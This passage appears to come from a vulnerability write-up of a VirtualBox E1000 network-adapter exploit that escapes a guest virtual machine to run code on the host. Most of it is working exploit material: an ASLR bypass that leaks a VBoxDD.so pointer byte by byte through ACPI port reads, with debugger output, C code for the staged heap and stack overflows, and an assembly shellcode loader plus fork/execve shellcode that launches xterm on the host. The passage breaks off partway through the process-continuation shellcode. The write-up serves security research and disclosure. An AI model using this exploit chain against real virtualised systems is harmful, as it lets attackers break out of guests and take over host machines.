&lt;span class=&quot;pl-k&quot;&gt;typedef&lt;/span&gt; &lt;span class=&quot;pl-k&quot;&gt;struct&lt;/span&gt; ACPIState
{
...
    &lt;span class=&quot;pl-c1&quot;&gt;uint8_t&lt;/span&gt;             au8SMBusBlkDat[&lt;span class=&quot;pl-c1&quot;&gt;32&lt;/span&gt;];
    &lt;span class=&quot;pl-c1&quot;&gt;uint8_t&lt;/span&gt;             u8SMBusBlkIdx;
    &lt;span class=&quot;pl-c1&quot;&gt;uint32_t&lt;/span&gt;            uPmTimeOld;
    &lt;span class=&quot;pl-c1&quot;&gt;uint32_t&lt;/span&gt;            uPmTimeA;
    &lt;span class=&quot;pl-c1&quot;&gt;uint32_t&lt;/span&gt;            uPmTimeB;
    &lt;span class=&quot;pl-c1&quot;&gt;uint32_t&lt;/span&gt;            Alignment5;
} ACPIState;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;An ACPI port input/output handler is registered for 0x4100-0x410F range. In the case of 0x4107 port we have:&lt;/p&gt;
&lt;div class=&quot;highlight highlight-source-c&quot;&gt;
&lt;pre&gt;
&lt;span class=&quot;pl-en&quot;&gt;PDMBOTHCBDECL&lt;/span&gt;(&lt;span class=&quot;pl-k&quot;&gt;int&lt;/span&gt;) acpiR3SMBusRead(PPDMDEVINS pDevIns, &lt;span class=&quot;pl-k&quot;&gt;void&lt;/span&gt; *pvUser, RTIOPORT Port, &lt;span class=&quot;pl-c1&quot;&gt;uint32_t&lt;/span&gt; *pu32, &lt;span class=&quot;pl-k&quot;&gt;unsigned&lt;/span&gt; cb)
{
    &lt;span class=&quot;pl-c1&quot;&gt;RT_NOREF1&lt;/span&gt;(pDevIns);
    ACPIState *pThis = (ACPIState *)pvUser;
...
    &lt;span class=&quot;pl-k&quot;&gt;switch&lt;/span&gt; (off)
    {
...
        &lt;span class=&quot;pl-k&quot;&gt;case&lt;/span&gt; SMBBLKDAT_OFF:
            *pu32 = pThis-&amp;gt;&lt;span class=&quot;pl-smi&quot;&gt;au8SMBusBlkDat&lt;/span&gt;[pThis-&amp;gt;&lt;span class=&quot;pl-smi&quot;&gt;u8SMBusBlkIdx&lt;/span&gt;];
            pThis-&amp;gt;&lt;span class=&quot;pl-smi&quot;&gt;u8SMBusBlkIdx&lt;/span&gt;++;
            pThis-&amp;gt;&lt;span class=&quot;pl-smi&quot;&gt;u8SMBusBlkIdx&lt;/span&gt; &amp;amp;= &lt;span class=&quot;pl-k&quot;&gt;sizeof&lt;/span&gt;(pThis-&amp;gt;&lt;span class=&quot;pl-smi&quot;&gt;au8SMBusBlkDat&lt;/span&gt;) - &lt;span class=&quot;pl-c1&quot;&gt;1&lt;/span&gt;;
            &lt;span class=&quot;pl-k&quot;&gt;break&lt;/span&gt;;
...
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;When the guest OS executes INB(0x4107) instruction to read one byte from the port, the handler takes one bytes from au8SMBusBlkDat[32] array at u8SMBusBlkIdx index and returns it to the guest. And this is how to apply the write primitive: since the distance between virtual device heap blocks are constant, so is the distance from EEPROM93C46.m_au16Data array to ACPIState.u8SMBusBlkIdx. Writing two bytes to ACPIState.u8SMBusBlkIdx we can read arbitrary data in the range of 255 bytes from ACPIState.au8SMBusBlkDat.&lt;/p&gt;
&lt;p&gt;There is an obstacle. Having a look to ACPIState structure it can be seen that the array is placed at the end of the structure. The remaining fields are useless to leak. So let's look what can be found after the structure:&lt;/p&gt;
&lt;pre&gt;
&lt;code&gt;gef➤  x/16gx (ACPIState*)(0x7fc47008be70+0x100)+1
0x7fc47008d4e0: 0xffffe98100000090      0xfffd9b2000000000
0x7fc47008d4f0: 0x00007fc470067a00      0x00007fc470067a00
0x7fc47008d500: 0x00000000a0028a00      0x00000000000e0000
0x7fc47008d510: 0x00000000000e0fff      0x0000000000001000
0x7fc47008d520: 0x000000ff00000002      0x0000100000000000
0x7fc47008d530: 0x00007fc47008c358      0x00007fc44d6ecdc6
0x7fc47008d540: 0x0031000035944000      0x00000000000002b8
0x7fc47008d550: 0x00280001d3878000      0x0000000000000000
gef➤  x/s 0x00007fc44d6ecdc6
0x7fc44d6ecdc6: &quot;ACPI RSDP&quot;
gef➤  vmmap VBoxDD.so
Start                           End                             Offset                          Perm Path
0x00007fc44d4f3000 0x00007fc44d768000 0x0000000000000000 r-x /home/user/src/VirtualBox-5.2.20/out/linux.amd64/release/bin/VBoxDD.so
0x00007fc44d768000 0x00007fc44d968000 0x0000000000275000 --- /home/user/src/VirtualBox-5.2.20/out/linux.amd64/release/bin/VBoxDD.so
0x00007fc44d968000 0x00007fc44d977000 0x0000000000275000 r-- /home/user/src/VirtualBox-5.2.20/out/linux.amd64/release/bin/VBoxDD.so
0x00007fc44d977000 0x00007fc44d980000 0x0000000000284000 rw- /home/user/src/VirtualBox-5.2.20/out/linux.amd64/release/bin/VBoxDD.so
gef➤  p 0x00007fc44d6ecdc6 - 0x00007fc44d4f3000
$2 = 0x1f9dc6
&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;It seems there is a pointer to a string placed at a fixed offset from VBoxDD.so image base. The pointer lies at 0x58 offset at the end of ACPIState. We can read that pointer byte-by-byte using the primitives and finally obtain VBoxDD.so image base. We just hope that data past ACPIState structure is not random on each virtual machine boot. Hopefully, it isn't; the pointer at 0x58 offset is always there.&lt;/p&gt;
&lt;h4&gt;Information Leak&lt;/h4&gt;
&lt;p&gt;Now we combine write and read primitives and exploit them to bypass ASLR. We will overflow the heap overwriting EEPROM93C46 structure, then trigger EEPROM finite automaton to write the index to ACPIState structure, and then execute INB(0x4107) in the guest to access ACPI to read one byte of the pointer. Repeat those 8 times incrementing the index by 1.&lt;/p&gt;
&lt;div class=&quot;highlight highlight-source-c&quot;&gt;
&lt;pre&gt;
&lt;span class=&quot;pl-c1&quot;&gt;uint64_t&lt;/span&gt; &lt;span class=&quot;pl-en&quot;&gt;stage_1_main&lt;/span&gt;(&lt;span class=&quot;pl-k&quot;&gt;void&lt;/span&gt;* mmio, &lt;span class=&quot;pl-k&quot;&gt;void&lt;/span&gt;* tx_ring) {
    &lt;span class=&quot;pl-c1&quot;&gt;printk&lt;/span&gt;(KERN_INFO PFX&lt;span class=&quot;pl-s&quot;&gt;&lt;span class=&quot;pl-pds&quot;&gt;&quot;&lt;/span&gt;##### Stage 1 #####&lt;span class=&quot;pl-cce&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;pl-pds&quot;&gt;&quot;&lt;/span&gt;&lt;/span&gt;);

    &lt;span class=&quot;pl-c&quot;&gt;&lt;span class=&quot;pl-c&quot;&gt;//&lt;/span&gt; When loopback mode is enabled data (network packets actually) of every Tx Data Descriptor &lt;/span&gt;
    &lt;span class=&quot;pl-c&quot;&gt;&lt;span class=&quot;pl-c&quot;&gt;//&lt;/span&gt; is sent back to the guest and handled right now via e1kHandleRxPacket.&lt;/span&gt;
    &lt;span class=&quot;pl-c&quot;&gt;&lt;span class=&quot;pl-c&quot;&gt;//&lt;/span&gt; When loopback mode is disabled data is sent to a network as usual.&lt;/span&gt;
    &lt;span class=&quot;pl-c&quot;&gt;&lt;span class=&quot;pl-c&quot;&gt;//&lt;/span&gt; We disable loopback mode here, at Stage 1, to overflow the heap but not touch the stack buffer&lt;/span&gt;
    &lt;span class=&quot;pl-c&quot;&gt;&lt;span class=&quot;pl-c&quot;&gt;//&lt;/span&gt; in e1kHandleRxPacket. Later, at Stage 2 we enable loopback mode to overflow heap and &lt;/span&gt;
    &lt;span class=&quot;pl-c&quot;&gt;&lt;span class=&quot;pl-c&quot;&gt;//&lt;/span&gt; the stack buffer.&lt;/span&gt;
    &lt;span class=&quot;pl-c1&quot;&gt;e1000_disable_loopback_mode&lt;/span&gt;(mmio);

    &lt;span class=&quot;pl-c1&quot;&gt;uint8_t&lt;/span&gt; leaked_bytes[&lt;span class=&quot;pl-c1&quot;&gt;8&lt;/span&gt;];
    &lt;span class=&quot;pl-c1&quot;&gt;uint32_t&lt;/span&gt; i;
    &lt;span class=&quot;pl-k&quot;&gt;for&lt;/span&gt; (i = &lt;span class=&quot;pl-c1&quot;&gt;0&lt;/span&gt;; i &amp;lt; &lt;span class=&quot;pl-c1&quot;&gt;8&lt;/span&gt;; i++) {
        &lt;span class=&quot;pl-c1&quot;&gt;stage_1_overflow_heap_buffer&lt;/span&gt;(mmio, tx_ring, i);
        leaked_bytes[i] = &lt;span class=&quot;pl-c1&quot;&gt;stage_1_leak_byte&lt;/span&gt;();

        &lt;span class=&quot;pl-c1&quot;&gt;printk&lt;/span&gt;(KERN_INFO PFX&lt;span class=&quot;pl-s&quot;&gt;&lt;span class=&quot;pl-pds&quot;&gt;&quot;&lt;/span&gt;Byte &lt;span class=&quot;pl-c1&quot;&gt;%d&lt;/span&gt; leaked: 0x&lt;span class=&quot;pl-c1&quot;&gt;%02X&lt;/span&gt;&lt;span class=&quot;pl-cce&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;pl-pds&quot;&gt;&quot;&lt;/span&gt;&lt;/span&gt;, i, leaked_bytes[i]);
    }

    &lt;span class=&quot;pl-c1&quot;&gt;uint64_t&lt;/span&gt; leaked_vboxdd_ptr = *(&lt;span class=&quot;pl-c1&quot;&gt;uint64_t&lt;/span&gt;*)leaked_bytes;
    &lt;span class=&quot;pl-c1&quot;&gt;uint64_t&lt;/span&gt; vboxdd_base = leaked_vboxdd_ptr - LEAKED_VBOXDD_RVA;
    &lt;span class=&quot;pl-c1&quot;&gt;printk&lt;/span&gt;(KERN_INFO PFX&lt;span class=&quot;pl-s&quot;&gt;&lt;span class=&quot;pl-pds&quot;&gt;&quot;&lt;/span&gt;Leaked VBoxDD.so pointer: 0x&lt;span class=&quot;pl-c1&quot;&gt;%016llx&lt;/span&gt;&lt;span class=&quot;pl-cce&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;pl-pds&quot;&gt;&quot;&lt;/span&gt;&lt;/span&gt;, leaked_vboxdd_ptr);
    &lt;span class=&quot;pl-c1&quot;&gt;printk&lt;/span&gt;(KERN_INFO PFX&lt;span class=&quot;pl-s&quot;&gt;&lt;span class=&quot;pl-pds&quot;&gt;&quot;&lt;/span&gt;Leaked VBoxDD.so base: 0x&lt;span class=&quot;pl-c1&quot;&gt;%016llx&lt;/span&gt;&lt;span class=&quot;pl-cce&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;pl-pds&quot;&gt;&quot;&lt;/span&gt;&lt;/span&gt;, vboxdd_base);

    &lt;span class=&quot;pl-k&quot;&gt;return&lt;/span&gt; vboxdd_base;
}
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;It has been said that in order for the integer underflow not to lead to the stack buffer overflow, certain E1000 registers should been configured. The idea is that the buffer is being overflowed in e1kHandleRxPacket function which is called while handling Tx descriptors in the loopback mode. Indeed, in the loopback mode the guest sends network packets to itself so they are received right after being sent. We disable this mode so e1kHandleRxPacket is unreachable.&lt;/p&gt;
&lt;h3&gt;DEP Bypass&lt;/h3&gt;
&lt;p&gt;We have bypassed ASLR. Now the loopback mode can be enabled and the stack buffer overflow can be triggered.&lt;/p&gt;
&lt;div class=&quot;highlight highlight-source-c&quot;&gt;
&lt;pre&gt;
&lt;span class=&quot;pl-k&quot;&gt;void&lt;/span&gt; &lt;span class=&quot;pl-en&quot;&gt;stage_2_overflow_heap_and_stack_buffers&lt;/span&gt;(&lt;span class=&quot;pl-k&quot;&gt;void&lt;/span&gt;* mmio, &lt;span class=&quot;pl-k&quot;&gt;void&lt;/span&gt;* tx_ring, &lt;span class=&quot;pl-c1&quot;&gt;uint64_t&lt;/span&gt; vboxdd_base) {
    &lt;span class=&quot;pl-c1&quot;&gt;off_t&lt;/span&gt; buffer_pa;
    &lt;span class=&quot;pl-k&quot;&gt;void&lt;/span&gt;* buffer_va;
    &lt;span class=&quot;pl-c1&quot;&gt;alloc_buffer&lt;/span&gt;(&amp;amp;buffer_pa, &amp;amp;buffer_va);

    &lt;span class=&quot;pl-c1&quot;&gt;stage_2_set_up_buffer&lt;/span&gt;(buffer_va, vboxdd_base);
    &lt;span class=&quot;pl-c1&quot;&gt;stage_2_trigger_overflow&lt;/span&gt;(mmio, tx_ring, buffer_pa);

    &lt;span class=&quot;pl-c1&quot;&gt;free_buffer&lt;/span&gt;(buffer_va);
}

&lt;span class=&quot;pl-k&quot;&gt;void&lt;/span&gt; &lt;span class=&quot;pl-en&quot;&gt;stage_2_main&lt;/span&gt;(&lt;span class=&quot;pl-k&quot;&gt;void&lt;/span&gt;* mmio, &lt;span class=&quot;pl-k&quot;&gt;void&lt;/span&gt;* tx_ring, &lt;span class=&quot;pl-c1&quot;&gt;uint64_t&lt;/span&gt; vboxdd_base) {
    &lt;span class=&quot;pl-c1&quot;&gt;printk&lt;/span&gt;(KERN_INFO PFX&lt;span class=&quot;pl-s&quot;&gt;&lt;span class=&quot;pl-pds&quot;&gt;&quot;&lt;/span&gt;##### Stage 2 #####&lt;span class=&quot;pl-cce&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;pl-pds&quot;&gt;&quot;&lt;/span&gt;&lt;/span&gt;);

    &lt;span class=&quot;pl-c1&quot;&gt;e1000_enable_loopback_mode&lt;/span&gt;(mmio);
    &lt;span class=&quot;pl-c1&quot;&gt;stage_2_overflow_heap_and_stack_buffers&lt;/span&gt;(mmio, tx_ring, vboxdd_base);
    &lt;span class=&quot;pl-c1&quot;&gt;e1000_disable_loopback_mode&lt;/span&gt;(mmio);
}
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;For now, when the last instruction of e1kHandleRxPacket is executed the saved return address is overwritten and control is transferred anywhere the attacker wants. But DEP is still there. It is bypassed in a classical way of building a ROP chain. ROP gadgets allocate executable memory, copy a shellcode loader into and execute it.&lt;/p&gt;
&lt;h3&gt;Shellcode&lt;/h3&gt;
&lt;p&gt;The shellcode loader is trivial. It copies the beginning of the overflowing buffer next to it.&lt;/p&gt;
&lt;div class=&quot;highlight highlight-source-assembly&quot;&gt;
&lt;pre&gt;
&lt;span class=&quot;pl-en&quot;&gt;use64&lt;/span&gt;

&lt;span class=&quot;pl-en&quot;&gt;start:&lt;/span&gt;
&lt;span class=&quot;pl-en&quot;&gt;    &lt;/span&gt;&lt;span class=&quot;pl-k&quot;&gt;lea&lt;/span&gt;&lt;span class=&quot;pl-en&quot;&gt; &lt;/span&gt;&lt;span class=&quot;pl-v&quot;&gt;rsi&lt;/span&gt;&lt;span class=&quot;pl-s1&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;pl-en&quot;&gt; &lt;/span&gt;&lt;span class=&quot;pl-s1&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;pl-v&quot;&gt;rsp&lt;/span&gt;&lt;span class=&quot;pl-en&quot;&gt; &lt;/span&gt;&lt;span class=&quot;pl-s1&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;pl-en&quot;&gt; &lt;/span&gt;&lt;span class=&quot;pl-c1&quot;&gt;0x4170&lt;/span&gt;&lt;span class=&quot;pl-s1&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;pl-c&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;pl-en&quot;&gt;    &lt;/span&gt;&lt;span class=&quot;pl-k&quot;&gt;push&lt;/span&gt;&lt;span class=&quot;pl-en&quot;&gt; &lt;/span&gt;&lt;span class=&quot;pl-v&quot;&gt;rax&lt;/span&gt;
&lt;span class=&quot;pl-en&quot;&gt;    &lt;/span&gt;&lt;span class=&quot;pl-k&quot;&gt;pop&lt;/span&gt;&lt;span class=&quot;pl-en&quot;&gt; &lt;/span&gt;&lt;span class=&quot;pl-v&quot;&gt;rdi&lt;/span&gt;
&lt;span class=&quot;pl-en&quot;&gt;    &lt;/span&gt;&lt;span class=&quot;pl-k&quot;&gt;add&lt;/span&gt;&lt;span class=&quot;pl-en&quot;&gt; &lt;/span&gt;&lt;span class=&quot;pl-v&quot;&gt;rdi&lt;/span&gt;&lt;span class=&quot;pl-s1&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;pl-en&quot;&gt; loader_size&lt;/span&gt;
&lt;span class=&quot;pl-en&quot;&gt;    &lt;/span&gt;&lt;span class=&quot;pl-k&quot;&gt;mov&lt;/span&gt;&lt;span class=&quot;pl-en&quot;&gt; &lt;/span&gt;&lt;span class=&quot;pl-v&quot;&gt;rcx&lt;/span&gt;&lt;span class=&quot;pl-s1&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;pl-en&quot;&gt; &lt;/span&gt;&lt;span class=&quot;pl-c1&quot;&gt;0x800&lt;/span&gt;
&lt;span class=&quot;pl-en&quot;&gt;    &lt;/span&gt;&lt;span class=&quot;pl-k&quot;&gt;rep&lt;/span&gt;&lt;span class=&quot;pl-en&quot;&gt; &lt;/span&gt;&lt;span class=&quot;pl-k&quot;&gt;movsb&lt;/span&gt;
&lt;span class=&quot;pl-en&quot;&gt;    &lt;/span&gt;&lt;span class=&quot;pl-k&quot;&gt;nop&lt;/span&gt;

&lt;span class=&quot;pl-en&quot;&gt;payload:&lt;/span&gt;
&lt;span class=&quot;pl-c&quot;&gt;    ; Here the shellcode is to be&lt;/span&gt;

&lt;span class=&quot;pl-en&quot;&gt;loader_size = $ &lt;/span&gt;&lt;span class=&quot;pl-s1&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;pl-en&quot;&gt; start&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;The shellcode is executed. Its first part is:&lt;/p&gt;
&lt;div class=&quot;highlight highlight-source-assembly&quot;&gt;
&lt;pre&gt;
&lt;span class=&quot;pl-en&quot;&gt;use64&lt;/span&gt;

&lt;span class=&quot;pl-en&quot;&gt;start:&lt;/span&gt;
&lt;span class=&quot;pl-c&quot;&gt;    ; sys_fork&lt;/span&gt;
&lt;span class=&quot;pl-en&quot;&gt;    &lt;/span&gt;&lt;span class=&quot;pl-k&quot;&gt;mov&lt;/span&gt;&lt;span class=&quot;pl-en&quot;&gt; &lt;/span&gt;&lt;span class=&quot;pl-v&quot;&gt;rax&lt;/span&gt;&lt;span class=&quot;pl-s1&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;pl-en&quot;&gt; &lt;/span&gt;&lt;span class=&quot;pl-c1&quot;&gt;58&lt;/span&gt;
&lt;span class=&quot;pl-en&quot;&gt;    &lt;/span&gt;&lt;span class=&quot;pl-k&quot;&gt;syscall&lt;/span&gt;

&lt;span class=&quot;pl-en&quot;&gt;    &lt;/span&gt;&lt;span class=&quot;pl-k&quot;&gt;test&lt;/span&gt;&lt;span class=&quot;pl-en&quot;&gt; &lt;/span&gt;&lt;span class=&quot;pl-v&quot;&gt;rax&lt;/span&gt;&lt;span class=&quot;pl-s1&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;pl-en&quot;&gt; &lt;/span&gt;&lt;span class=&quot;pl-v&quot;&gt;rax&lt;/span&gt;
&lt;span class=&quot;pl-en&quot;&gt;    &lt;/span&gt;&lt;span class=&quot;pl-k&quot;&gt;jnz&lt;/span&gt;&lt;span class=&quot;pl-en&quot;&gt; continue_process_execution&lt;/span&gt;

&lt;span class=&quot;pl-c&quot;&gt;    ; Initialize argv&lt;/span&gt;
&lt;span class=&quot;pl-en&quot;&gt;    &lt;/span&gt;&lt;span class=&quot;pl-k&quot;&gt;lea&lt;/span&gt;&lt;span class=&quot;pl-en&quot;&gt; &lt;/span&gt;&lt;span class=&quot;pl-v&quot;&gt;rsi&lt;/span&gt;&lt;span class=&quot;pl-s1&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;pl-en&quot;&gt; &lt;/span&gt;&lt;span class=&quot;pl-s1&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;pl-en&quot;&gt;cmd&lt;/span&gt;&lt;span class=&quot;pl-s1&quot;&gt;]&lt;/span&gt;
&lt;span class=&quot;pl-en&quot;&gt;    &lt;/span&gt;&lt;span class=&quot;pl-k&quot;&gt;mov&lt;/span&gt;&lt;span class=&quot;pl-en&quot;&gt; &lt;/span&gt;&lt;span class=&quot;pl-s1&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;pl-en&quot;&gt;argv&lt;/span&gt;&lt;span class=&quot;pl-s1&quot;&gt;],&lt;/span&gt;&lt;span class=&quot;pl-en&quot;&gt; &lt;/span&gt;&lt;span class=&quot;pl-v&quot;&gt;rsi&lt;/span&gt;

&lt;span class=&quot;pl-c&quot;&gt;    ; Initialize envp&lt;/span&gt;
&lt;span class=&quot;pl-en&quot;&gt;    &lt;/span&gt;&lt;span class=&quot;pl-k&quot;&gt;lea&lt;/span&gt;&lt;span class=&quot;pl-en&quot;&gt; &lt;/span&gt;&lt;span class=&quot;pl-v&quot;&gt;rsi&lt;/span&gt;&lt;span class=&quot;pl-s1&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;pl-en&quot;&gt; &lt;/span&gt;&lt;span class=&quot;pl-s1&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;pl-en&quot;&gt;env&lt;/span&gt;&lt;span class=&quot;pl-s1&quot;&gt;]&lt;/span&gt;
&lt;span class=&quot;pl-en&quot;&gt;    &lt;/span&gt;&lt;span class=&quot;pl-k&quot;&gt;mov&lt;/span&gt;&lt;span class=&quot;pl-en&quot;&gt; &lt;/span&gt;&lt;span class=&quot;pl-s1&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;pl-en&quot;&gt;envp&lt;/span&gt;&lt;span class=&quot;pl-s1&quot;&gt;],&lt;/span&gt;&lt;span class=&quot;pl-en&quot;&gt; &lt;/span&gt;&lt;span class=&quot;pl-v&quot;&gt;rsi&lt;/span&gt;

&lt;span class=&quot;pl-c&quot;&gt;    ; sys_execve&lt;/span&gt;
&lt;span class=&quot;pl-en&quot;&gt;    &lt;/span&gt;&lt;span class=&quot;pl-k&quot;&gt;lea&lt;/span&gt;&lt;span class=&quot;pl-en&quot;&gt; &lt;/span&gt;&lt;span class=&quot;pl-v&quot;&gt;rdi&lt;/span&gt;&lt;span class=&quot;pl-s1&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;pl-en&quot;&gt; &lt;/span&gt;&lt;span class=&quot;pl-s1&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;pl-en&quot;&gt;cmd&lt;/span&gt;&lt;span class=&quot;pl-s1&quot;&gt;]&lt;/span&gt;
&lt;span class=&quot;pl-en&quot;&gt;    &lt;/span&gt;&lt;span class=&quot;pl-k&quot;&gt;lea&lt;/span&gt;&lt;span class=&quot;pl-en&quot;&gt; &lt;/span&gt;&lt;span class=&quot;pl-v&quot;&gt;rsi&lt;/span&gt;&lt;span class=&quot;pl-s1&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;pl-en&quot;&gt; &lt;/span&gt;&lt;span class=&quot;pl-s1&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;pl-en&quot;&gt;argv&lt;/span&gt;&lt;span class=&quot;pl-s1&quot;&gt;]&lt;/span&gt;
&lt;span class=&quot;pl-en&quot;&gt;    &lt;/span&gt;&lt;span class=&quot;pl-k&quot;&gt;lea&lt;/span&gt;&lt;span class=&quot;pl-en&quot;&gt; &lt;/span&gt;&lt;span class=&quot;pl-v&quot;&gt;rdx&lt;/span&gt;&lt;span class=&quot;pl-s1&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;pl-en&quot;&gt; &lt;/span&gt;&lt;span class=&quot;pl-s1&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;pl-en&quot;&gt;envp&lt;/span&gt;&lt;span class=&quot;pl-s1&quot;&gt;]&lt;/span&gt;
&lt;span class=&quot;pl-en&quot;&gt;    &lt;/span&gt;&lt;span class=&quot;pl-k&quot;&gt;mov&lt;/span&gt;&lt;span class=&quot;pl-en&quot;&gt; &lt;/span&gt;&lt;span class=&quot;pl-v&quot;&gt;rax&lt;/span&gt;&lt;span class=&quot;pl-s1&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;pl-en&quot;&gt; &lt;/span&gt;&lt;span class=&quot;pl-c1&quot;&gt;59&lt;/span&gt;
&lt;span class=&quot;pl-en&quot;&gt;    &lt;/span&gt;&lt;span class=&quot;pl-k&quot;&gt;syscall&lt;/span&gt;

&lt;span class=&quot;pl-en&quot;&gt;...&lt;/span&gt;

&lt;span class=&quot;pl-en&quot;&gt;cmd     db &lt;/span&gt;&lt;span class=&quot;pl-s&quot;&gt;'/usr/bin/xterm'&lt;/span&gt;&lt;span class=&quot;pl-s1&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;pl-en&quot;&gt; &lt;/span&gt;&lt;span class=&quot;pl-c1&quot;&gt;0&lt;/span&gt;
&lt;span class=&quot;pl-en&quot;&gt;env     db &lt;/span&gt;&lt;span class=&quot;pl-s&quot;&gt;'DISPLAY=:0.0'&lt;/span&gt;&lt;span class=&quot;pl-s1&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;pl-en&quot;&gt; &lt;/span&gt;&lt;span class=&quot;pl-c1&quot;&gt;0&lt;/span&gt;
&lt;span class=&quot;pl-en&quot;&gt;argv    dq &lt;/span&gt;&lt;span class=&quot;pl-c1&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;pl-s1&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;pl-en&quot;&gt; &lt;/span&gt;&lt;span class=&quot;pl-c1&quot;&gt;0&lt;/span&gt;
&lt;span class=&quot;pl-en&quot;&gt;envp    dq &lt;/span&gt;&lt;span class=&quot;pl-c1&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;pl-s1&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;pl-en&quot;&gt; &lt;/span&gt;&lt;span class=&quot;pl-c1&quot;&gt;0&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;It does fork and execve to create /usr/bin/xterm process. The attacker gains control over the host's ring 3.&lt;/p&gt;
&lt;h3&gt;Process Continuation&lt;/h3&gt;
&lt;p&gt;I believe every exploit should be finished. It means it should not crash an application, though it's not always possible, of course. We need the virtual machine to continue execution which is achieved by the second part of shellcode.&lt;/p&gt;
&lt;div class=&quot;highlight highlight-source-assembly&quot;&gt;
&lt;pre&gt;
&lt;span class=&quot;pl-en&quot;&gt;continue_process_execution:&lt;/span&gt;
&lt;span class=&quot;pl-c&quot;&gt;    ; Restore RBP&lt;/span&gt;
&lt;span class=&quot;pl-en&quot;&gt;    &lt;/span&gt;&lt;span class=&quot;pl-k&quot;&gt;mov&lt;/span&gt;&lt;span class=&quot;pl-en&quot;&gt; &lt;/span&gt;&lt;span class=&quot;pl-v&quot;&gt;rbp&lt;/span&gt;&lt;span class=&quot;pl-s1&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;pl-en&quot;&gt; &lt;/span&gt;&lt;span class=&quot;pl-v&quot;&gt;rsp&lt;/span&gt;
&lt;span class=&quot;pl-en&quot;&gt;    &lt;/span&gt;&lt;span class=&quot;pl-k&quot;&gt;add&lt;/span&gt;&lt;span class=&quot;pl-en&quot;&gt; &lt;/span&gt;&lt;span class=&quot;pl-v&quot;&gt;rbp&lt;/span&gt;&lt;span class=&quot;pl-s1&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;pl-en&quot;&gt; &lt;/span&gt;&lt;span class=&quot;pl-c1&quot;&gt;0x48&lt;/span&gt;

&lt;span class=&quot;pl-c&quot;&gt;    ; Skip junk&lt;/span&gt;
&lt;span class=&quot;pl-en&quot;&gt;    &lt;/span&gt;&lt;span class=&quot;pl-k&quot;&gt;add&lt;/span&gt;&lt;span class=&quot;pl-en&quot;&gt; &lt;/span&gt;&lt;span class=&quot;pl-v&quot;&gt;rsp&lt;/span&gt;&lt;span class=&quot;pl-s1&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;pl-en&quot;&gt; &lt;/span&gt;&lt;span class=&quot;pl-c1&quot;&gt;0x10&lt;/span&gt;

&lt;span class=&quot;pl-c&quot;&gt;    ; Restore the registers that must be preserved according to System V ABI&lt;/span&gt;
&lt;span class=&quot;pl-en&quot;&gt;    &lt;/span&gt;&lt;span class=&quot;pl-k&quot;&gt;pop&lt;/span&gt;&lt;span class=&quot;pl-en&quot;&gt; &lt;/span&gt;&lt;span class=&quot;pl-v&quot;&gt;rbx&lt;/span&gt;
&lt;span class=&quot;pl-en&quot;&gt;    &lt;/span&gt;&lt;span class=&quot;pl-k&quot;&gt;pop&lt;/span&gt;&lt;span class=&quot;pl-en&quot;&gt; &lt;/span&gt;&lt;span class=&quot;pl-v&quot;&gt;r12&lt;/span&gt;
&lt;span class=&quot;pl-en&quot;&gt;    &lt;/span&gt;&lt;span class=&quot;pl-k&quot;&gt;pop&lt;/span&gt;&lt;span class=&quot;pl-en&quot;&gt; &lt;/span&gt;&lt;span class=&quot;pl-v&quot;&gt;r13&lt;/span&gt;
&lt;span class=&quot;pl-en&quot;&gt;    &lt;/span&gt;&lt;span class=&quot;pl-k&quot;&gt;pop&lt;/span&gt;&lt;span class=&quot;pl-en&quot;&gt; &lt;/span&gt;&lt;span class=&quot;pl-v&quot;&gt;r14&lt;/span&gt;
&lt;span class=&quot;pl-en&quot;&gt;    &lt;/span&gt;&lt;span class=&quot;pl-k&quot;&gt;pop&lt;/span&gt;&lt;span class=&quot;pl-en&quot;&gt; &lt;/span&gt;&lt;span class=&quot;pl-v&quot;&gt;r15&lt;/span&gt;

&lt;span class=&quot;pl-c&quot;&gt;    ; Skip junk&lt;/span&gt;
